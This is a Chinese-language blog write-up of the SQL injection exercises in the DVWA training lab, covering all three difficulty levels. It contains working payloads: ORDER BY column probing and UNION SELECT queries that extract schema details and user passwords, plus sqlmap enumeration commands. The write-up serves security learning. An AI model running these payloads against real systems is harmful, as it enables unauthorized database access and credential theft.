---
title: "DVWA-SQL注入全难度"
permalink: "/2023/06/07/dvwa试玩/"
pubDatetime: 2023-06-07T12:39:10.000Z
modDatetime: 2023-06-10T03:29:04.198Z
description: "对于mysql来说，有三个很重要的表和一个数据库： 这三张表中： 注入点的地方：接受相关参数未经正确处理直接带入数据库进行查询操作。"
tags: ["渗透"]
categories: []
---

## 手工注入步骤

1. 查询当前注入可展现的表的列数，也就是这个页面源代码里面自己设置的输出的列数的数目
2. 查询当前这个列数的表的输出顺序，有时候网站的输出顺序是不一样的
3. 查询现在源代码所在的数据库名字
4. 通过information\_schema 数据库中的table表进行当前数据库所拥有的表名的查询
5. 通过information\_schema 数据库中的column表进行表名中的查询
6. 如果password在这里面，就在这里查询

### 基础知识

对于mysql来说，有三个很重要的表和一个数据库：

- 数据库：information\_schema
- 表：tables，columns，schemata

这三张表中：

- tables：存有数据库中的所有表，字段为： `table_name`, `table_schema`
- columns：存有表项相关的内容，字段为：`column_name`,`table_name`, `table_schema`
- schemata：存有数据库名的内容，字段：`schema_name`

### 流程

#### 观察有没有SQL注入点

注入点的地方：接受相关参数未经正确处理直接带入数据库进行查询操作。

我们对输入框进行输入，输入1时，发现没有问题，

![image-20230607200850316](/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230607200850316.png)

然后尝试输入1’,发现报错了

![image-20230607200951083](/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230607200951083.png)

这就是最初级的，毫无安全措施的版本，发现了注入点：因为我们发现我们输入的语句直接变成了在SQL语句中的报错，有两个相同的`'`号，其实在这里我们就已经可以知道这是字符型注入了（初级）

#### 判断注入点类型

注入点分为数值和字符，我们可以通过两个命令看看，

**id=1 and 1=1**和**id=1 and 1=2**

##### 字符型

原理是这样的：

如果这个注入点是字符型的，那么当我输入1 and 1=2或者1 and 1=1的时候，在SQL语句中会自动变成


```sql
select * from user where id='1 and 1=2' 
select * from user where id='1 and 1=1' 
```


那么根据SQL语句的类型转换：

如果在一个数字上下文（例如，用于数字运算、比较或者作为函数的数值型参数）中使用一个字符串，MySQL会将这个字符串尽可能地转换为一个数字。它将从字符串的最左边开始，扫描到第一个无法识别为数字部分的字符为止。

这个语句会变成


```sql
select * from user where id='1' 
```


它不会报错，所以是字符型注入

##### 数值型

如果这个注入点是数值型的话，那么当我输入1 and 1=2或者1 and 1=1的时候，在SQL语句中会自动变成


```sql
select * from user where id=1 and 1=2
select * from user where id=1 and 1=1 
```


可以看出前者会报错（报错通常也不会回显），后者不会

##### 结论

输入**id=1 and 1=1**和**id=1 and 1=2**

- 两者都不报错：字符型注入
- 前者不报错，后者报错：数值型注入

#### 获取字段数

字段数的获取，目的是为了弄清楚这个表中有几个字段，如果后面需要用到`union select`就很需要先了解这个前提，通过以下方式（#号时为了注释后面的）：


```sql
1' order by 2#
1' order by 3#
1' order by 4#
```


来查看有多少字段

#### 联合查询

联合查询直接在网上找教程就好了，这里直接给code


```sql
1' union select database(),version()
1' union select table_name,2 from information_schema.tables where table_schema='dvwa'
1' union select column_name,2 from information_schema.columns where table_name='users'
1' union select password,2 from users
```


## 初级

所以我们在初级部分直接使用就好了，记得后面添加注释符

![image-20230609210851975](/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230609210851975.png)

## 中级

中级的是直接换成了按键选取

![image-20230609210959162](/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230609210959162.png)

我们要意识到，按键只是表面，它的深层次内容就是：POST请求，一切的请求都是网络请求。为什么要说这个呢？我想表达的是，我们可以直接通过抓包，来改变我们想要的请求。

可以使用的方法挺多的，不过网上能够找到的基本都是使用Burpsuite来抓包，我们也可以这样。不过也可以用火狐的`hackbar`插件（不过说实话Burpsuite也很方便，没必要改）

先使用抓包工具抓包，看看报文POST请求的格式，这里直接F12

![image-20230609211552266](/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230609211552266.png)
![image-20230609212634991](/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230609212634991.png)

提交Payload后发现报错

![image-20230609212733611](/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230609212733611.png)

发现原来不是字符型注入，原来是数值型注入，后面的步骤就和初级是一样的了,Payload为：


```sql
1 union select password,2 from users #
```


这道题给我的感悟：还是要把检测字符型注入还是数值型注入放在第一位。

## 高级

打开高级的题目

![image-20230610110056173](/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230610110056173.png)

发现它是用了单独另开一个界面的方法，这样通过Burpsuite抓包返回的就是这个小窗口了。我们尝试注入一下，发现`1 and 1=2`和`1 and 1=1` 都不报错，可以看出是字符型注入

使用上面整理的命令直接可以得到结果

## sqlmap命令注入使用

### 查看可以不可以注入


```powershell
sqlmap -u "这里是包含着你的注入点的url" --cookie "如果中途返回302重定向就代表你需要cookie"
```


### 查看数据库


```powershell
sqlmap -u "你的url" --dbs
```


### 查看表


```powershell
sqlmap -u "你的url" -D <数据库名> --tables
```


### 查看列名


```powershell
sqlmap -u "你的url" -D <数据库名> -T --columns
```


## 参考

<https://blog.csdn.net/m0_51756263/article/details/125692951>
